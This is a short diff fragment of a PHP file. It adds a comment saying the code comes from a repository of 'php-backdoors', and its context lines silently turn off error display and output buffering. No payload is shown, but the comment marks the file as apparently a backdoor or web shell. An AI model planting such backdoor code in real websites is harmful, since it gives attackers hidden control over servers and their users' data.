@@ -1,4 +1,5 @@
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 
 @ini_set('output_buffering',0); 
 @ini_set('display_errors', 0);
